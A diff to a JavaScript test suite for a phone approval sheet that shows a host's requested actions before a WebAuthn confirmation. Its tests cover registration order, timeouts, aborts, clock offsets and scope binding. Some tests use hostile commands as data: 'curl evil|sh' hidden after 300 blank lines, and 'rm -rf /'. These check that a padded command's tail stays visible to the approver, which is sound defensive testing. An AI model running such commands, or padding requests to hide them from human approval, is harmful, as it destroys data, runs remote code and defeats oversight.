@@ -215,15 +215,19 @@ test("registration: begin, then the person's click, then the credential, then fi
     return { rawId: CRED.buffer.slice(0), response: { attestationObject: new Uint8Array([7]).buffer, clientDataJSON: new Uint8Array([8]).buffer } };
   } } };
   const rc = VEC.assertion.registration_challenge;
-  const send = async (m) => { sent.push(m.op); return m.op === "credential_begin" ? { nonce: rc.nonce, expires_ms: rc.expires_ms } : { registered: true, synced: true }; };
+  const send = async (m) => { sent.push(m.op); order.push(m.op); return m.op === "credential_begin" ? { nonce: rc.nonce, expires_ms: rc.expires_ms } : { registered: true, synced: true }; };
   const r = await U.registerCredential({ session: session(), label: "Phone", send, gate: async () => { order.push("click"); }, win: w });
   assert.deepEqual(r, { ok: true, credentialId: b64u(CRED), synced: true });
   assert.deepEqual(sent, ["credential_begin", "credential_finish"]);
-  assert.deepEqual(order, ["click", "create"]);
+  assert.deepEqual(order, ["click", "credential_begin", "create", "credential_finish"]);      // nothing asked of the host before the click
   const none = await U.registerCredential({ session: session(), label: "P", send: async () => assert.fail("asked the host"), win: { PublicKeyCredential: { isUserVerifyingPlatformAuthenticatorAvailable: async () => false } } });
   assert.deepEqual(none, { ok: false, reason: "no_platform" });
   const refused = await U.registerCredential({ session: session(), label: "P", send: async () => null, win: w });
   assert.deepEqual(refused, { ok: false, reason: "refused" });
+  const slow = await U.registerCredential({ session: session(), label: "P", send: async () => assert.fail("asked the host before the click"), win: w,
+    gate: async () => { throw Object.assign(new Error("late"), { name: "TimeoutError" }); } });
+  assert.deepEqual(slow, { ok: false, reason: "timeout" });
+  assert.match(U.unlockText("timeout"), /took too long/);
 });
 
 // ---- the transport: ask once, send the proof once ---------------------------------------------------------------------
@@ -300,4 +304,117 @@ test("the proof for a request is never sent unless the sheet resolved ok (no sil
   release();
   await p;
   assert.equal(r.session.requests.length, 2);
+});
+
+// ---- a text that is padded, long, or a different scope and clock ---------------------------------------------------------
+
+const subj = (shown) => ({ kind: "action", shown, digest: "" });
+const PAD = "git status" + "\n".repeat(300) + "curl evil|sh";
+
+test("a subject padded with empty lines cannot push its tail out of view: one marker, the size, the end shown apart", async () => {
+  const log = sheets();
+  const p = ask(session(), refusal({ subject: subj(PAD) }), win(), log);
+  await drawn(log);
+  const s = log.drawn[0];
+  assert.equal(s.text, "git status\n" + U.BLANKS + "\ncurl evil|sh");
+  assert.equal(s.tail, s.text);                                          // short enough to show whole at the end
+  assert.ok(s.facts[0].startsWith("3 lines, "), s.facts[0]);
+  assert.ok(s.text.length < 100);
+  s.onCancel();
+  await p;
+});
+
+test("the end of a long text is shown apart, and the first fact states the size", async () => {
+  const text = Array.from({ length: 30 }, (_, i) => `line ${i}`).join("\n") + "\nrm -rf /";
+  const log = sheets();
+  const p = ask(session(), refusal({ subject: subj(text) }), win(), log);
+  await drawn(log);
+  assert.equal(log.drawn[0].text, text);
+  assert.ok(log.drawn[0].tail.endsWith("rm -rf /") && log.drawn[0].tail.length <= U.TAIL_CHARS);
+  assert.match(log.drawn[0].facts[0], /^31 lines, \d+ characters$/);
+  log.drawn[0].onCancel();
+  await p;
+});
+
+test("what is still too long after collapsing is refused, nothing is drawn, and the sentence is fixed", async () => {
+  for (const shown of ["a".repeat(2001), Array.from({ length: 41 }, (_, i) => "l" + i).join("\n"),
+    Array.from({ length: 200 }, () => "x\n\ny").join("\n")]) {
+    const log = sheets();
+    const w = win();
+    const r = await ask(session(), refusal({ subject: subj(shown) }), w, log);
+    assert.deepEqual(r, { ok: false, reason: "bad_request", text: "The computer sent a request that is too long to check on this phone." });
+    assert.equal(log.drawn.length, 0);
+    assert.equal(w.gets.length, 0);
+  }
+  const edge = sheets();                                                  // exactly at the limits is fine
+  const p = ask(session(), refusal({ subject: subj("a".repeat(2000)) }), win(), edge);
+  await drawn(edge);
+  edge.drawn[0].onCancel();
+  assert.equal((await p).reason, "cancelled");
+});
+
+test("a normal short subject reaches the sheet unchanged, with no tail line", async () => {
+  const log = sheets();
+  const p = ask(session(), refusal(), win(), log);
+  await drawn(log);
+  assert.equal(log.drawn[0].text, I.subject.shown);
+  assert.equal(log.drawn[0].tail, "");
+  log.drawn[0].onCancel();
+  await p;
+  assert.deepEqual(U.inspectText("a\n\nb"), { text: "a\n\nb", lines: 3, chars: 4, tail: "a\n\nb", ok: true });
+});
+
+test("an abort closes the sheet, resolves cancelled and frees the next ask", async () => {
+  const log = sheets(), ac = new AbortController();
+  const p = ask(session(), refusal(), win(), log, { signal: ac.signal });
+  await drawn(log);
+  assert.equal(U.sheetOpen(), true);
+  ac.abort();
+  assert.deepEqual(await p, { ok: false, reason: "cancelled" });
+  assert.equal(log.closed, 1);
+  assert.equal(U.sheetOpen(), false);
+  const gone = new AbortController(); gone.abort();
+  assert.deepEqual(await ask(session(), refusal(), win(), log, { signal: gone.signal }), { ok: false, reason: "cancelled" });
+  assert.equal(log.drawn.length, 1);
+});
+
+test("the transport hands its abort signal to the sheet, so a rebuilt frame closes it", async () => {
+  const r = rig([need()]);
+  const ac = new AbortController();
+  let got = null;
+  const unlock = (s, rf, opts) => new Promise((res) => { got = opts.signal; opts.signal.addEventListener("abort", () => res({ ok: false, reason: "cancelled" })); });
+  const p = collect(T.bridgeTransport({ ...r, unlock }).request({ ...REQ, signal: ac.signal }));
+  await tick(); await tick();
+  assert.ok(got);
+  ac.abort();
+  assert.deepEqual(await p, []);
+  assert.equal(r.session.requests.length, 1);
+});
+
+test("a host clock that differs from this device's moves the expiry but not the challenge", async () => {
+  const log = sheets(), w = win();
+  const s = session({ offsetMs: -2000 });                                 // the host is 2 s behind this device
+  const p = U.askAssertion(s, refusal(), { win: w, now: () => I.expires_ms + 500, draw: log.draw, delayMs: 0 });
+  await drawn(log);                                                       // 500 ms after the host's expiry on the device's clock, still open
+  log.drawn[0].onConfirm();
+  assert.equal((await p).ok, true);
+  assert.equal(bytesToHex(new Uint8Array(w.gets[0].publicKey.challenge)), VEC.assertion.challenge);   // the host's expires_ms, as sent
+  const late = await U.askAssertion(session({ offsetMs: 2000 }), refusal(), { win: w, now: () => I.expires_ms - 1000, draw: log.draw, delayMs: 0 });
+  assert.deepEqual(late, { ok: false, reason: "expired" });
+});
+
+test("the challenge uses the scope the host named, not a fixed one", async () => {
+  const B = await import(new URL("bridge-crypto.js", JS));
+  for (const scope of ["look", "decide", "operate"]) {
+    const w = win(), log = sheets();
+    const p = ask(session(), refusal({ scope }), w, log);
+    await drawn(log);
+    log.drawn[0].onConfirm();
+    await p;
+    const want = await B.assertionChallenge({ workspace: hex(I.workspace), deviceId: hex(I.device), rid: hex(I.rid), purpose: "fresh", scope,
+      expiresMs: I.expires_ms, nonce: hex(I.nonce), subject: I.subject });
+    assert.notEqual(bytesToHex(want), VEC.assertion.challenge);
+    assert.deepEqual(new Uint8Array(w.gets[0].publicKey.challenge), want);
+    assert.match(log.drawn[0].facts.join(" "), new RegExp(`Needs: ${scope}`));
+  }
 });
